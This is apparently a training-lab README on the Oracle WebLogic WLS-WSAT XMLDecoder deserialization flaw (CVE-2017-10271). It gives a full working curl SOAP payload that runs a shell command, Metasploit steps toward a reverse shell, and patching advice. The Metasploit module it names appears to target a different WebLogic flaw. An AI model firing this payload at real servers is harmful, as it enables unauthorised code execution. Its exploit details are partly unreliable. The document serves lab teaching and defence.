# Oracle WebLogic WLS-WSAT XMLDecoder Insecure Deserialization RCE (CVE-2017-10271)

## Overview

Oracle WebLogic Server vulnerability CVE-2017-10271 is a critical pre-authentication Remote Code Execution vulnerability affecting WebLogic versions 10.3.6.0.0, 12.1.3.0.0, 12.2.1.1.0, and 12.2.1.2.0. With a CVSS 9.8 score, this vulnerability was heavily weaponized in the wild to compromise enterprise banking middleware and cloud compute instances for automated cryptomining botnets.

The flaw exists inside the **WLS-WSAT (WebLogic Web Services Atomic Transaction)** component deployed at `/wls-wsat/CoordinatorPortType`. When processing SOAP XML messages, WLS-WSAT uses Java's built-in `XMLDecoder` to deserialize XML tags into live Java objects. Because `XMLDecoder` by design can instantiate arbitrary Java classes (such as `java.lang.ProcessBuilder`), invoke constructors, and call methods based on XML element tags (`<void method="start">`), an unauthenticated attacker can execute arbitrary operating system commands simply by posting a SOAP envelope containing serialized XMLDecoder instructions.

- **Primary Interface**: `http://localhost:7001`
- **WLS-WSAT Endpoint**: `http://localhost:7001/wls-wsat/CoordinatorPortType`
- **Docker Shortcut**: `./lab start weblogic-rce`
- **Container Name**: `cyberlab_04_weblogic_rce`
- **RAM Footprint**: ~750 MB (Oracle WebLogic Server 10.3.6 + JDK 1.6/1.7)

---

## Exploitation Walkthrough

### 1. Verification of Vulnerability via Curl
Post an XML payload instantiating `java.lang.ProcessBuilder` to write a marker file:

```bash
curl -X POST -H "Content-Type: text/xml" \
  http://localhost:7001/wls-wsat/CoordinatorPortType \
  -d '<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
  <soapenv:Header>
    <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workcontext/">
      <java version="1.6.0" class="java.beans.XMLDecoder">
        <void class="java.lang.ProcessBuilder">
          <array class="java.lang.String" length="3">
            <void index="0"><string>/bin/bash</string></void>
            <void index="1"><string>-c</string></void>
            <void index="2"><string>id > /tmp/pwned</string></void>
          </array>
          <void method="start"/>
        </void>
      </java>
    </work:WorkContext>
  </soapenv:Header>
  <soapenv:Body/>
</soapenv:Envelope>'
```

### 2. Spawning Reverse Shell
Replace the command string with a reverse shell or use Metasploit:

```bash
msfconsole -q
use exploit/multi/misc/weblogic_deserialize_asyncresponseservice
set RHOSTS 127.0.0.1
set RPORT 7001
exploit
```

---

## Defensive Remediation & Hardening

1. **Apply Oracle Critical Patch Update (CPU)**:
   Apply the official Oracle security patch for CVE-2017-10271 / CVE-2019-2725.
2. **Remove or Restrict WLS-WSAT War Files**:
   If Web Services Atomic Transactions are not utilized, delete or rename `wls-wsat.war` from the WebLogic domain library directory.
3. **Network Isolation**:
   Block external internet access to T3 and administrative HTTP port 7001 using perimeter firewalls.

---

## Video Walkthroughs & Technical References

- [Demonstrating Remote Code Execution in Oracle's WebLogic Server](https://www.youtube.com/watch?v=HM3Z-I998b4)
- [Oracle Critical Patch Update Advisory](https://www.oracle.com/security-alerts/cpuoct2017.html)
- [Vulhub WebLogic CVE-2017-10271 Advisory](https://vulhub.org/#/environments/weblogic/CVE-2017-10271/)
